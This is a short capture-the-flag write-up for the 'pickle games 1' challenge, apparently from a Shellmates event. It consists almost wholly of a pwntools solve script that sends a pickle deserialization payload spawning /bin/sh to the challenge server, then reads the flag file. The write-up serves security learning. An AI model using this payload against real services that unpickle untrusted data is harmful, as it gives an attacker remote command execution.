# pickle games 1

## Write-up

Input is not filtered at all, we can send a classic pickle RCE payload: 

```python
#!/usr/bin/env python3

from pwn import *
import pickle

HOST, PORT, SSL = "pickle-games-1.challs.shellmates.club", 443, True

class RCE:
    def __reduce__(self):
        return os.system, ("/bin/sh",)

if __name__ == "__main__":
    io = remote(HOST, PORT, ssl=SSL)
    rce = RCE()
    payload = pickle.dumps(rce)
    data = payload.hex()
    io.recvuntil(b"data: ")
    io.sendline(data)
    io.sendline(b"id")
    io.sendline(b"cat flag.txt")
    io.interactive()
```

[solve.py](solve.py)

